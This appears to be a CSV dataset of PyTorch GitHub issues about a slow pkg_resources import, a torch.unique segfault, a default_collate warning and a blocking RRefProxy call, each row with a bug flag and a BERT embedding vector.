Issue Title,Issue Body,Is Bug,BERT Embedding
torch dependencies aren't fully specified + pkg_resources import is slow triage review module: build triaged,"### ðŸ› Describe the bug

In pytorch/torch_version.py, we do `from pkg_resources import packaging`.

https://github.com/pytorch/pytorch/blob/83b45fe1666fd8ecc697078ca99ff46dabe0286b/torch/torch_version.py#L3

This causes two problems:
- We have an undeclared runtime dependency on setuptools. Currently pytorch only has declared dependencies on typing_extensions and dataclasses: https://github.com/pytorch/pytorch/blob/83b45fe1666fd8ecc697078ca99ff46dabe0286b/setup.py#L409
- pkg_resources is a really slow import. It takes a full 1s on my laptop, sometimes longer depending on disk cache. Moreover, we're not actually using pkg_resources itself, we're using pkg_resource's vendored version of https://github.com/pypa/packaging

Possible fixes:
- Declare a dependency on `packaging` and replace `from pkg_resources import packaging` with `import packaging.version`. This makes torch imports much faster! :-)
- Don't declare a dependency on `packaging`, but try to import it, and fallback to `from pkg_resources import packaging`. This doesn't fix the undeclared dependency, but it does make `import torch` faster.
Another variation on this is to try to steal vendored `packaging` from a package that imports faster, e.g. `pip._vendor.packaging.version`.  We could combine that with fallback to `pkg_resources` as well.
- Vendor the appropriate code from `packaging.version`

### Versions

1.10.1

cc @malfet @seemethere",True,"[-5.29260635e-01 -2.02525016e-02 -3.84106159e-01  1.01240188e-01
  1.86636269e-01 -2.33283743e-01 -2.84016937e-01  1.48761258e-01
 -7.27362096e-01 -1.41792580e-01 -1.81085661e-01 -3.39688361e-03
 -4.73600805e-01  5.56672700e-02  7.89596364e-02  2.56226361e-01
 -2.10492492e-01 -3.80472034e-01  1.05176270e-02 -3.34713399e-01
  1.20079011e-01 -1.27041638e-01 -6.18195906e-02  2.07616668e-02
 -3.21867853e-01  1.00132182e-01 -1.91985697e-01 -1.14510223e-01
  7.37051442e-02  2.03837901e-01 -5.11724725e-02  1.40198827e-01
 -3.94821584e-01 -1.66347712e-01  5.13777733e-01  1.83308005e-01
 -7.20314085e-02 -4.46310610e-01  1.03610367e-01 -2.35148072e-01
  3.75570923e-01  2.98954874e-01 -2.63003886e-01  2.34144002e-01
 -4.14636314e-01  2.00034738e-01  1.97285742e-01  2.37530902e-01
 -5.18410981e-01 -2.97191381e-01 -9.10971314e-03  2.02346683e-01
 -2.19930187e-01  7.09759668e-02  1.17476597e-01 -6.46973193e-01
 -5.58686629e-03  2.27100551e-01  2.51762569e-01 -3.35160255e-01
  3.71557832e-01 -1.60402685e-01 -1.22388124e-01 -2.83093303e-02
 -9.51052755e-02 -2.43759155e-03  5.97661249e-02 -1.66615695e-01
  2.89618373e-01  7.57635310e-02 -3.06260884e-01 -6.15324602e-02
 -3.11587192e-02 -9.72890202e-03 -5.94936907e-02 -9.98050123e-02
 -2.80376047e-01  3.15022826e-01 -1.57864735e-01 -1.34080291e-01
  8.35497826e-02 -1.72622293e-01  4.25298065e-02 -2.06313670e-01
 -1.77369118e-01 -1.96006522e-01  5.82463518e-02 -1.77814532e-02
  3.03764343e-01  1.87190786e-01  3.46494079e-01  5.03193289e-02
  6.08676553e-01  5.32590449e-01 -2.81223357e-01  3.55756581e-01
  8.55744630e-02 -4.11092788e-01 -1.65569991e-01 -2.56486773e-01
 -5.79905277e-03 -4.01344240e-01 -1.45936251e-01  3.01980197e-01
  4.85439301e-02 -2.00548545e-01  2.44147271e-01  6.42530501e-01
  3.88395816e-01 -1.73941210e-01  2.49453425e-01  2.80950904e-01
 -1.91827059e-01 -1.24272868e-01 -4.53993231e-02 -5.91341928e-02
 -4.52306628e-01 -9.59197953e-02 -1.64227769e-01  4.20983076e-01
  1.93880498e-01  1.16602778e-01  2.19240591e-01  2.01888919e-01
  2.75617152e-01  1.39047295e-01 -1.17399499e-01  2.06494510e-01
  1.85656890e-01  1.33689642e-01  3.14479209e-02  1.32802695e-01
  3.78772616e-04 -1.04532890e-01  4.18397009e-01  4.48993921e-01
 -5.37815094e-01 -1.26998663e-01  2.33766884e-01 -1.85795590e-01
 -3.06852758e-01  3.45276684e-01  1.44722700e-01 -3.47644269e-01
 -1.84973836e-01 -6.98301792e-02 -1.52635545e-01  3.14571202e-01
  2.02536117e-02 -1.12398952e-01  1.81558713e-01 -4.03512359e-01
 -1.39250278e-01  5.65730035e-01  2.88455456e-01 -1.06784701e-01
  2.05729395e-01  8.61359388e-03  2.18399331e-01 -1.28596425e-01
  1.26397222e-01  1.34040657e-02 -2.95325574e-02 -1.34394899e-01
 -3.40659916e-01 -1.97385266e-01 -5.26336670e-01 -2.86159992e-01
 -1.57369286e-01  6.48218468e-02 -1.71704203e-01  4.38465588e-02
  1.77889988e-02 -2.14298412e-01  1.63848132e-01  4.43200022e-03
 -2.14608274e-02 -8.76792371e-02 -1.39562637e-01  4.93508637e-01
  1.17772140e-01  5.89169264e-01  3.48076522e-01  5.55683766e-03
  1.96811140e-01  1.88389108e-01  2.94179142e-01 -7.64040053e-02
  1.22214362e-01 -2.40771145e-01 -3.88920605e-01 -1.40946001e-01
  3.02239418e-01 -2.99401015e-01 -8.11581016e-02  2.81306088e-01
  1.42466277e-02  2.14598067e-02 -1.02386780e-01 -4.21521366e-01
  7.12452233e-02  4.48416173e-01 -1.32150471e-01  3.67115363e-02
  5.05086891e-02  1.95466578e-01 -3.78000766e-01 -4.47084606e-01
 -4.54495519e-01 -1.90458760e-01 -8.02515894e-02 -3.89310718e-01
 -5.19486070e-01 -2.11520836e-01 -1.19661294e-01  1.83473110e-01
  4.50017989e-01 -4.93072979e-02  1.52637050e-01  3.44972938e-01
  2.81650364e-01 -8.48259032e-02 -2.83734631e-02 -3.49814057e-01
  2.82430470e-01 -8.86719376e-02 -9.20952559e-02  1.54504001e-01
  1.62439734e-01 -3.11453909e-01 -3.62490982e-01 -3.39725435e-01
  5.12738109e-01  9.59888175e-02  2.24583954e-01  3.36378485e-01
 -7.90480077e-02 -2.81982541e-01  1.62892833e-01  1.68601066e-01
 -2.34566871e-02 -1.86173230e-01  5.36308229e-01 -3.13653290e-01
 -2.16978446e-01  1.17137760e-01 -4.49636787e-01 -1.24136612e-01
 -8.72150064e-02  2.64930546e-01 -9.85796377e-03 -2.72626758e-01
 -3.05099756e-01  2.79136360e-01  5.75410366e-01 -1.99940905e-01
 -1.35480225e-01 -2.10392877e-01  1.76831827e-01 -2.43908480e-01
  1.34692073e-01  2.77598828e-01 -2.01109692e-01  1.52612209e-01
  4.93781507e-01  1.64805293e-01 -2.50624716e-01 -8.58446956e-02
 -2.45821625e-01 -7.03559294e-02  1.32663995e-01 -4.92552251e-01
  5.68904996e-01  4.14816022e-01  5.74821472e-01 -7.50890654e-03
  2.89785773e-01  6.15149699e-02 -2.47369595e-02  1.49834275e-01
  2.96444714e-01  3.64830136e-01  2.71019395e-02  1.38231367e-01
  3.31300020e-01 -1.12076208e-01  4.84068617e-02 -1.76233798e-01
 -1.72197357e-01 -3.67908895e-01  9.39697996e-02 -9.58387032e-02
  8.61548841e-01  1.26336604e-01 -1.65194601e-01 -1.50426161e-02
 -1.47028744e-01  1.14883699e-01  1.73238635e-01  2.66470075e-01
 -2.28656277e-01  3.63213271e-02  2.45805010e-01 -7.79696628e-02
 -3.28563213e-01  3.39662522e-01 -2.21658617e-01  2.21723512e-01
  5.39121270e-01 -4.18389142e-01  2.43988708e-01  1.90109491e-01
 -1.55237362e-01  2.61272669e-01 -1.86576083e-01  1.64809637e-04
 -2.21199155e-01  5.20473003e-01  2.70166695e-01 -3.73200327e-03
  3.21928889e-01 -1.28862530e-01 -5.80979466e-01  1.99513942e-01
  7.56963268e-02 -7.61286616e-02 -4.03491795e-01  1.43741548e-01
 -1.87737837e-01  3.44759896e-02  1.99395925e-01 -2.22508162e-02
  1.14463240e-01  2.06361771e-01 -8.73176008e-02 -7.32651874e-02
 -8.55512619e-02  1.55432776e-01 -4.79230508e-02 -5.94219744e-01
 -1.88723251e-01 -8.86938199e-02  7.36898720e-01  1.68274604e-02
 -2.94570804e-01  2.86983829e-02  6.42965794e-01  1.26433581e-01
 -2.70551205e-01 -1.18653707e-01 -5.33967242e-02  1.24813735e-01
 -1.29429549e-01  1.24350309e-01  3.47586364e-01  2.73095429e-01
 -7.85246193e-02  2.69725502e-01  1.00118406e-01  2.86959350e-01
 -3.97576571e-01 -2.45042890e-02 -2.03340337e-01 -2.23686248e-02
  6.79547787e-02 -1.53820693e-01 -3.36145729e-01 -5.00698425e-02
 -4.00898099e-01  3.75999480e-01 -1.87985227e-01  1.64668649e-01
 -2.27016628e-01  1.61019281e-01  6.34166479e-01 -4.26375836e-01
  1.85939580e-01  3.49933319e-02 -2.49650031e-01 -3.09086531e-01
  3.36922444e-02  1.01378998e-02  2.75828719e-01 -2.91647434e-01]"
Segfault using `torch.unique` on tensor with NaNs with `dim=0` on PyTorch 1.10 high priority module: crash triaged module: regression,"### ðŸ› Describe the bug

`torch.unique(torch.tensor([float(""nan"")]), dim=0)` yields a segfault on PyTorch 1.10 while working fine on 1.9.

### To reproduce the issue

```python
# segfaults in torch 1.10, works as expected in torch 1.9:
tensor_nan = torch.tensor([float(""nan"")])
assert torch.unique(tensor_nan, dim=0).numel() == 1
assert torch.isnan(torch.unique(tensor_nan, dim=0)[0])
```

### Additional comments

Note that when leaving `dim` to its default (`None`), the segfault does not occur, i.e.:
```python
# works as expected in both torch 1.10 and 1.9:
tensor_nan = torch.tensor([float(""nan"")])
assert torch.unique(tensor_nan, dim=None).numel() == 1
assert torch.isnan(torch.unique(tensor_nan, dim=None)[0])
```

The problem does not occur for `float(""inf"")`, i.e.:
```python
# works as expected in both torch 1.10 and 1.9:
tensor_inf = torch.tensor([float(""inf"")])
assert torch.unique(tensor_inf, dim=0).numel() == 1
assert torch.isinf(torch.unique(tensor_inf, dim=0)[0])
```

### Versions

```
PyTorch version: 1.10.1
Is debug build: False
CUDA used to build PyTorch: None
ROCM used to build PyTorch: N/A

OS: macOS 12.0.1 (x86_64)
GCC version: Could not collect
Clang version: 13.0.0 (clang-1300.0.29.30)
CMake version: Could not collect
Libc version: N/A

Python version: 3.8.12 | packaged by conda-forge | (default, Oct 12 2021, 21:50:56)  [Clang 11.1.0 ] (64-bit runtime)
Python platform: macOS-10.16-x86_64-i386-64bit
Is CUDA available: False
CUDA runtime version: No CUDA
GPU models and configuration: No CUDA
Nvidia driver version: No CUDA
cuDNN version: No CUDA
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] torch==1.10.1
[conda] torch                     1.10.1                   pypi_0    pypi
```

cc @ezyang @gchanan @zou3519 @bdhirsh",True,"[-0.42564464 -0.23820512 -0.1620154   0.05998778  0.0226385  -0.08547534
  0.27205953  0.27463073 -0.27121937 -0.31948668 -0.26249143  0.1660109
 -0.24783704  0.2714401  -0.2010132   0.23369527 -0.37655085 -0.194397
 -0.03737708 -0.44700658  0.2618698  -0.09255494 -0.2479983   0.11447899
 -0.31735957  0.24808265 -0.06845072 -0.1028934   0.3225097  -0.04658052
 -0.12313811 -0.01211669 -0.5804117  -0.08097208 -0.10784644 -0.12160091
 -0.2683429   0.18213537 -0.3767591  -0.05961946  0.18042317  0.13702646
  0.04041709  0.0344731  -0.03293137  0.19924955  0.0187842   0.10951195
 -0.3517049   0.04217416 -0.24414624  0.13766108 -0.22107029 -0.08897392
  0.49696422 -0.26040456 -0.3120979  -0.14484797  0.25802958 -0.37617445
 -0.05433137  0.07199483 -0.18952897  0.04023358  0.01492968 -0.14479251
  0.24740548  0.0916064   0.287783    0.15126492  0.23149267 -0.14901285
  0.07280966 -0.12363909 -0.23559916  0.02231033 -0.47374803  0.37741065
 -0.09792524 -0.11723873  0.17047127 -0.0217253  -0.1363391  -0.27980846
  0.23836684  0.04606538  0.30993277 -0.06122787  0.44818538  0.42651135
  0.11735705  0.0575044   0.04504926  0.21195929  0.03037013  0.11284516
  0.10563464 -0.30125654  0.14238328 -0.07314308 -0.37410885 -0.56670743
 -0.23027459  0.55891645  0.2972473   0.07747774  0.2502854   0.28910497
  0.228924    0.00722468  0.4016283   0.10867688  0.17952478 -0.03067806
 -0.1470337  -0.02698782 -0.04990039  0.0524412   0.12104783  0.57606745
  0.1875653   0.2239577  -0.06392619  0.38934824  0.3217765   0.3981398
 -0.25044328 -0.05532115  0.12465121  0.10515425  0.03418407 -0.11874055
 -0.05577733  0.18543932  0.10152753  0.31274214 -0.6129545   0.2981444
 -0.15530327 -0.01170015 -0.08313307 -0.14772272 -0.12477262 -0.30122736
  0.25245425  0.00464975 -0.2793846   0.1716925  -0.0052328   0.18898809
 -0.14696172 -0.17555566 -0.429564    0.30017483 -0.09683374 -0.08960892
  0.02918096  0.09477326  0.36646715 -0.07815872  0.12483315  0.23923256
  0.18592751  0.00389626  0.26580992  0.09146141 -0.30240208  0.04609304
 -0.4114407  -0.03242247 -0.09471534 -0.21796045 -0.40164107 -0.27143928
  0.23454386 -0.21808517  0.02530847 -0.5096954  -0.31885153  0.32312202
  0.21156451  0.2735383   0.24065888  0.08065525 -0.11513709 -0.1536838
  0.4231518  -0.0900721  -0.13277434 -0.14228904 -0.49580467 -0.69585073
  0.42511076 -0.01093103  0.2533219   0.18052575 -0.08121516 -0.47325224
 -0.07479809 -0.11297899  0.16558054 -0.3056941   0.06426837 -0.04846003
  0.17961757  0.04912056 -0.39887413 -0.37724912 -0.4832381   0.10087902
  0.22100738 -0.25941944 -0.24095437 -0.09122259 -0.3042516   0.15233947
 -0.35937405 -0.00829044  0.12842278  0.43307453  0.44366378  0.07705875
 -0.20363398 -0.22438969 -0.19728258  0.03778753 -0.38164997  0.13556202
 -0.1512165   0.0740394  -0.02592393 -0.18260166  0.09564297  0.02460911
 -0.007239    0.3242122  -0.20397721 -0.01994855 -0.13114256  0.03928531
 -0.22602573  0.14203781  0.08941527 -0.3692539  -0.0020402   0.35378295
 -0.2510834  -0.04952636 -0.08489639  0.25182772  0.15079442  0.21748139
 -0.33652338 -0.00701239  0.41798085  0.06489685  0.19892792 -0.06591616
  0.16694018 -0.19749945 -0.00935957 -0.14573765  0.19537641  0.37844336
  0.10888477  0.35764262  0.08968899  0.39662996 -0.03117796 -0.10476347
 -0.19887857 -0.04523727  0.7778485  -0.01040847 -0.10749394 -0.38953012
  0.05416388 -0.05470244 -0.31134006 -0.3806855   0.34428352  0.28770646
 -0.23845251  0.44576794  0.25523454 -0.2134782  -0.16383393 -0.11784054
  0.1303353  -0.05889041 -0.27196634 -0.10712609  0.6575581  -0.14887923
 -0.22973093  0.16746931  0.15271813 -0.34792846 -0.01957241  0.14047813
  0.16436908  0.36543941  0.31970537  0.03608214  0.050616   -0.12729098
  0.19951794  0.11194149  0.30852735 -0.30795914  0.3432592   0.03690697
  0.00649124  0.12038474 -0.16171458  0.14302374 -0.22915047  0.14601205
  0.26565742  0.12667984 -0.16106023 -0.15177873 -0.22376966  0.32156736
  0.06127996  0.10287848 -0.07521264  0.01912331 -0.18285322 -0.07250378
 -0.01079139 -0.3048553   0.219975    0.04908898  0.08930841 -0.36234948
 -0.2809268   0.23079744  0.01838929 -0.24538621 -0.4719586  -0.41324392
 -0.04929682  0.04308483 -0.2683491  -0.22626139  0.27129638  0.09509236
  0.09580469 -0.0481056  -0.24288972 -0.00804835  0.22411415  0.42610523
 -0.0896904   0.3061561  -0.10711247  0.30890632 -0.0239152   0.4579118
 -0.00253535  0.20029427 -0.16364674 -0.14750741 -0.16551882  0.12702854
 -0.07270072 -0.3216492   0.08652619  0.46938074  0.2964775   0.2597813
  0.0495416   0.41699287  0.39021116 -0.26387197  0.17819409 -0.0966489
 -0.06173297 -0.16867676  0.0370517   0.19172157 -0.227595   -0.13213497]"
Noisy warning raised by 'default_collate' triaged module: data,"### ðŸ› Describe the bug

After upgrading pytorch version from 1.10.1 to the master branch (commit [d697bb4](https://github.com/pytorch/pytorch/commit/d697bb4220ff5ea8b46591cc082583bbf1a294a4)), `torch.utils.data._utils.collate.default_collate` raises the below noisy warning repeatedly:

```
UserWarning: An output with one or more elements was resized since it had shape [10], which does not
match the required output shape [2, 5].This behavior is deprecated, and in a future PyTorch release outputs will
not be resized unless they have zero elements. You can explicitly reuse an out tensor t by resizing it, inplace,
to zero elements with t.resize_(0).
```
The warning is original from [Resize.cpp](https://github.com/pytorch/pytorch/blob/master/aten/src/ATen/native/Resize.cpp#L11-L27) and triggered by [these lines](https://github.com/pytorch/pytorch/blob/master/torch/utils/data/_utils/collate.py#L130-L138) of `default_colloate`:

```
    elem = batch[0]
    elem_type = type(elem)
    if isinstance(elem, torch.Tensor):
        out = None
        if torch.utils.data.get_worker_info() is not None:
            # If we're in a background process, concatenate directly into a
            # shared memory tensor to avoid an extra copy
            numel = sum(x.numel() for x in batch)
            storage = elem.storage()._new_shared(numel)
            out = elem.new(storage)
        return torch.stack(batch, 0, out=out)
```

In case `default_collate` runs in background/worker process (torch.utils.data.get_worker_info() returns something), `out` is always a 1D tensor, but `batch` may has higher rank, thus a resize operation happens inside the `torch.stack` operation, which triggers the warning.

### Versions

Master branch (commit [d697bb4](https://github.com/pytorch/pytorch/commit/d697bb4220ff5ea8b46591cc082583bbf1a294a4))

# To Reproduce
Use this code snippet to reproduce the problem:

```
import torch

a, b = torch.randn([5]), torch.randn([5])
batch = [a, b]
elem = batch[0]

# In case torch.utils.data.get_worker_info() is not None
numel = sum(x.numel() for x in batch)
storage = elem.storage()._new_shared(numel)
out = elem.new(storage)

torch.stack(batch, 0, out=out)
```

# Expected behavior
No warning raises.

# Workaround

```
    elem = batch[0]
    elem_type = type(elem)
    if isinstance(elem, torch.Tensor):
        out = None
        if torch.utils.data.get_worker_info() is not None:
            # If we're in a background process, concatenate directly into a
            # shared memory tensor to avoid an extra copy
            numel = sum(x.numel() for x in batch)
            storage = elem.storage()._new_shared(numel)

            # reshape `out` before passing to torch.stack
            out = elem.new(storage).view(-1, *list(elem.size()))  

        return torch.stack(batch, 0, out=out)
```

Test code:

```
import torch

a, b = torch.randn([5]), torch.randn([5])
batch = [a, b]
elem = batch[0]

# In case torch.utils.data.get_worker_info() is not None
numel = sum(x.numel() for x in batch)
storage = elem.storage()._new_shared(numel)
out = elem.new(storage).view(-1, *list(elem.size()))

torch.stack(batch, 0, out=out)
```

cc @VitalyFedyunin @ejguan @NivekT",True,"[-2.02849030e-01 -3.47007848e-02 -3.72580945e-01  7.03851581e-02
  3.30058038e-02 -2.30031461e-01 -2.11905558e-02  1.02038532e-01
 -4.42258716e-01 -2.00109392e-01  5.38482368e-02 -1.43469214e-01
 -7.63745606e-02 -9.49989185e-02 -2.64073983e-02  2.19971407e-03
 -4.66740914e-02 -1.82684399e-02 -1.53156847e-01 -3.68051052e-01
  2.56604463e-01 -6.55421764e-02 -1.37185663e-01  1.72268897e-02
  2.86657996e-02  2.40876898e-01  5.14259227e-02 -9.19350982e-03
 -2.18236800e-02  1.32184312e-01  8.71880129e-02  4.14118528e-01
 -2.26858884e-01  7.23312944e-02  2.13011980e-01  1.33384556e-01
 -1.75123632e-01 -1.77624196e-01 -6.49801642e-03  1.71956569e-01
  1.74184531e-01  3.37696195e-01  1.23762630e-01  1.86124712e-01
 -2.87065029e-01 -4.55065593e-02 -2.37328529e-01  1.55447483e-01
 -3.73622477e-01 -8.89374614e-02 -6.09751418e-02 -6.66138679e-02
 -2.25736961e-01 -2.97643006e-01  1.37750030e-01 -3.52422982e-01
 -1.58966035e-01  1.04469940e-01  7.93436468e-02 -1.50190920e-01
  2.05901146e-01 -1.97443187e-01 -5.47287054e-02  1.57057017e-01
 -1.76263720e-01  1.91593125e-01  5.29211164e-02 -1.28757387e-01
  5.27547240e-01  8.40472132e-02 -1.21142328e-01 -7.54789263e-02
 -2.09803015e-01 -4.10153985e-01  7.73003548e-02 -1.01367608e-01
 -5.75808406e-01  3.99076283e-01 -1.11847132e-01 -1.57004446e-01
  1.63472190e-01 -4.58789803e-02  3.42360362e-02 -2.17793941e-01
  5.66314831e-02 -1.49790064e-01  2.77399212e-01  1.60750508e-01
  2.76792109e-01 -2.75535248e-02  4.09874022e-01 -4.75523993e-04
  1.31040543e-01  4.79393244e-01 -3.57961357e-01  3.48023176e-01
  1.59915209e-01 -2.25740910e-01  5.67137189e-02 -2.85509646e-01
 -2.48648554e-01 -4.62956816e-01 -2.04310223e-01  5.67208886e-01
 -5.04707173e-02 -3.62959653e-01  2.28427917e-01  1.50092378e-01
  3.66865635e-01 -1.88637257e-01  2.88842767e-01  1.43924907e-01
 -1.90692246e-01  3.67674939e-02  3.08805192e-03  2.34772246e-02
 -4.34841067e-02  6.78491518e-02 -9.19760987e-02  2.56828010e-01
  3.11674893e-01  1.06305525e-01 -7.36775398e-02  3.76364201e-01
  2.04687864e-01  1.98367864e-01 -2.87205875e-01  1.77910686e-01
  2.33247355e-02  2.45288834e-02  9.44789946e-02 -1.54999003e-01
  9.76416469e-02 -1.29125237e-01  1.61487944e-02 -7.71325529e-02
 -1.51701108e-01  7.63301253e-02 -1.99862923e-02 -4.76053394e-02
  8.98249447e-03 -5.93332238e-02 -9.61414129e-02 -2.08631560e-01
 -6.96872324e-02  2.55375028e-01 -2.28155330e-01  1.46138847e-01
  1.98304564e-01  1.24799222e-01 -6.85373098e-02 -8.10377821e-02
 -4.36385483e-01  6.59996092e-01  2.78756768e-01  1.55617565e-01
  2.42092237e-01  3.88689013e-03  4.59679842e-01 -3.98586810e-01
  9.04590040e-02  4.09334898e-01  1.05846688e-01 -9.72629562e-02
  5.91629222e-02 -1.25019386e-01 -3.39983910e-01 -1.37580246e-01
 -1.65244475e-01  1.94580257e-02 -1.87341243e-01  1.36365056e-01
  8.02327693e-02 -3.77680928e-01 -8.50939751e-02 -1.54323682e-01
  2.18984157e-01 -2.96433419e-01 -1.23426750e-01  4.56005752e-01
  1.34455204e-01  5.30776978e-01  2.63861507e-01  2.33156353e-01
 -1.81505037e-03  2.47233123e-01  4.77415621e-02 -1.45093739e-01
 -1.32061422e-01 -3.54552865e-01 -3.82581204e-01 -1.04455113e-01
  3.00858021e-01 -1.27222642e-01  1.77896097e-02 -1.72847249e-02
  2.09578395e-01 -2.06975698e-01  2.85643823e-02 -1.65487200e-01
 -1.53743804e-01  2.34413326e-01 -1.14581008e-02 -2.39205137e-02
  2.19112068e-01  6.35940731e-02 -2.38524050e-01 -2.85275996e-01
 -1.84420854e-01  9.42931250e-02 -4.05079722e-01 -2.59270370e-01
 -2.05689788e-01 -2.61588506e-02 -2.21474245e-01  3.35721076e-01
 -1.77423377e-02  3.20730507e-01  5.06786369e-02  3.01502705e-01
  3.82023215e-01 -3.09457868e-01 -4.72874530e-02 -5.15913546e-01
  6.63087070e-02  1.97272405e-01 -2.86672473e-01 -4.49761823e-02
 -5.00533134e-02 -7.88961351e-03 -8.08388740e-02 -7.21375644e-02
  4.17707741e-01  1.74008489e-01  8.60592872e-02  3.81690979e-01
 -1.44991487e-01 -4.89577018e-02  4.09024954e-03  3.44800442e-01
 -2.08222449e-01  5.91755137e-02  1.08834594e-01 -1.71680883e-01
 -1.91300869e-01  1.02166593e-01 -3.09002042e-01 -1.60117671e-01
 -2.37640530e-01  1.07956111e-01  5.64017892e-02 -1.34955510e-01
 -2.91228890e-01 -1.17225580e-01  3.12973976e-01  1.42298192e-01
  1.23449847e-01 -4.29664925e-02 -4.50408906e-02 -2.36469194e-01
  3.79799485e-01 -1.21049576e-01 -8.73543471e-02  4.51655716e-01
  1.36004254e-01  3.15812767e-01 -8.87922496e-02  2.26016834e-01
 -1.20404251e-01 -1.58260837e-01  1.62064657e-01 -1.98701575e-01
  3.03512216e-01  1.48470104e-01  2.32884988e-01 -9.49223861e-02
  3.45643222e-01 -3.96507978e-01 -1.37530580e-01 -1.33529734e-02
  1.47996694e-01  4.03809547e-02  1.07411668e-01  2.59661704e-01
  4.38827366e-01 -2.90327221e-01 -1.88926160e-02 -3.36715043e-01
 -2.36953229e-01 -3.39491963e-02 -2.76112318e-01 -7.89769813e-02
  7.89321542e-01  2.35048026e-01 -1.49249762e-01  2.08124399e-01
 -1.76564842e-01 -4.35833856e-02  3.79609168e-01  8.70497748e-02
 -4.99876440e-01 -8.55757669e-02  7.19112083e-02 -2.65323162e-01
 -3.32222581e-01  1.56716794e-01 -1.65792555e-01 -1.01188920e-01
  7.58044720e-01 -6.59778535e-01  2.54239857e-01  3.49631399e-01
  7.93329477e-02  3.53989869e-01 -1.90247685e-01  1.23513371e-01
 -3.63715738e-01  3.18156570e-01  2.22287789e-01 -3.67176235e-02
 -7.74848610e-02 -1.27125680e-01 -5.43795884e-01  2.32127696e-01
  4.69683081e-01  1.08436510e-01 -6.26836181e-01 -2.90971637e-01
 -2.14841049e-02 -9.18347836e-02 -1.13631394e-02 -5.01667010e-03
  1.91149265e-02  1.11638270e-01  9.29008871e-02 -2.23280907e-01
 -9.37444419e-02  1.59989437e-03 -9.00477022e-02 -3.02293867e-01
 -1.18444934e-01  1.04336128e-01  2.02755213e-01 -1.41655102e-01
 -2.41856053e-01 -1.01394966e-01  3.79426003e-01  6.04561687e-01
 -2.63765872e-01 -1.03083476e-01  1.73820332e-02  1.27392918e-01
  2.06009205e-03  2.02403635e-01 -7.86582679e-02  5.19872129e-01
  2.35362828e-01  2.77557552e-01  2.91890740e-01  4.95063782e-01
 -1.57648355e-01  1.41027629e-01 -4.31795806e-01  1.69313893e-01
 -1.39809072e-01 -1.90861568e-01 -2.30796695e-01 -2.41712213e-01
 -1.75466724e-02  3.71167600e-01 -3.31453800e-01  6.29522875e-02
 -2.20911235e-01  1.50792167e-01  1.89924255e-01 -1.83977365e-01
  3.17048401e-01 -4.30975854e-02  2.11335346e-03  1.22916093e-02
  1.27596825e-01  2.33709678e-01 -5.44421151e-02 -2.15478390e-01]"
Get rid of the blocking call in RRefProxy oncall: distributed module: bootcamp triaged module: rpc,"RRefProxy (`rref.rpc_async`, `rref.rpc_sync`, `rref.remote`) currently uses a blocking RPC call to the owner 


https://github.com/pytorch/pytorch/blob/885a8e53bab50b1ac53e6c140cc0a9953e7e288e/torch/distributed/rpc/rref_proxy.py#L15-L19

https://github.com/pytorch/pytorch/blob/885a8e53bab50b1ac53e6c140cc0a9953e7e288e/torch/distributed/rpc/api.py#L409-L419

This violates the promise of `rpc_async` and `remote` being non-blocking. Instead, we should use the async call, and chain the remaining code in `_invoke_rpc` as a callback. 

cc @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @rohan-varma @gqchen @aazzolini @osalpekar @jiayisuse @SciPioneer @H-Huang @jjlilley @mrzzd",True,"[-1.79166973e-01 -4.73501354e-01 -4.58725631e-01  1.11816071e-01
  3.00336897e-01  1.84173062e-01 -2.84040701e-02  1.56293750e-01
 -3.27577949e-01 -8.42600763e-02  5.37832901e-02 -3.04418802e-01
 -1.65393040e-01  1.34988829e-01 -2.98068434e-01  2.92341352e-01
 -4.51173484e-02 -3.65129411e-02 -7.74844177e-03 -2.01285370e-02
  3.15344296e-02  2.51790658e-02 -1.11268219e-02  3.98670733e-02
 -3.17403644e-01 -2.77612329e-01  4.93178666e-02 -2.86376536e-01
 -1.58297364e-02  4.95511740e-01  2.57708341e-01 -1.50661379e-01
  2.69674789e-03 -3.67953122e-01  5.35445929e-01  1.69591993e-01
 -7.08318427e-02 -6.29450232e-02 -1.02896661e-01 -3.18123579e-01
  2.90663410e-02  7.08930194e-02  2.40474761e-01  2.18222916e-01
 -1.42798245e-01  1.66895956e-01 -2.97694393e-02  2.32067138e-01
 -1.02425896e-01 -3.47981274e-01 -1.77412033e-02 -5.54638822e-03
 -3.38337533e-02 -3.75235319e-01 -2.26449184e-02 -1.00844949e-01
  1.88269913e-01  1.99942648e-01  1.20977074e-01  4.42249566e-01
  9.74620879e-02 -5.07447898e-01  4.25074995e-03 -1.77569434e-01
  1.27210021e-02  2.69668102e-01 -1.09724648e-01 -1.53428599e-01
  4.28604454e-01  4.04175997e-01 -7.09043816e-02 -1.25323266e-01
  1.45788029e-01  3.41694541e-02  5.78500867e-01  2.65097246e-02
 -3.57546598e-01  1.46371529e-01  3.49788040e-01 -2.38640592e-01
 -2.89388031e-01  1.71541542e-01  2.98184931e-01 -3.73977363e-01
 -8.84945244e-02  8.84908736e-02  4.58476871e-01  1.81998357e-01
  2.57515967e-01 -2.01364487e-01  1.53863877e-02 -3.96690294e-02
  1.99466914e-01  4.50686812e-01 -2.47664392e-01  1.39956757e-01
  6.66324273e-02 -3.12085822e-02 -3.85373712e-01 -2.45290324e-01
  2.88993195e-02 -5.85911497e-02 -3.88216078e-01  4.75728571e-01
 -2.02448759e-02 -3.46572638e-01  3.83662164e-01  2.02433735e-01
 -1.77754194e-01  8.26744437e-02  1.35916710e-01  1.57095492e-01
 -3.64933312e-01  2.89597392e-01  7.27128088e-02  1.71251372e-01
  4.22927052e-01 -2.64787704e-01  1.20415941e-01  1.68241352e-01
 -2.42009029e-01 -1.32639349e-01  2.38868713e-01 -7.53206909e-02
 -5.68439849e-02 -3.87037218e-01 -4.85196114e-02  2.24875361e-01
  1.38614684e-01 -6.66855574e-02 -2.84962833e-01  4.66112271e-02
  2.48471871e-01 -2.12355740e-02 -7.18615651e-02 -1.01092637e-01
 -3.12247369e-02 -2.40210727e-01 -1.06994532e-01 -2.45263860e-01
  2.97688127e-01  4.54424620e-01  2.19831839e-02 -3.20076615e-01
 -1.87940985e-01 -1.16398513e-01 -2.02523932e-01 -1.77980751e-01
  5.44936508e-02  2.50380456e-01  2.44777530e-01 -1.13580249e-01
  6.48342520e-02  2.38608077e-01  2.31150746e-01  1.82731092e-01
  3.81239146e-01 -3.06824055e-02  8.30004439e-02 -5.36625326e-01
 -2.10714072e-01  1.09020114e-01  3.52936327e-01  1.46033198e-01
  2.99935997e-01 -3.39293212e-01 -5.29309571e-01  2.28080656e-02
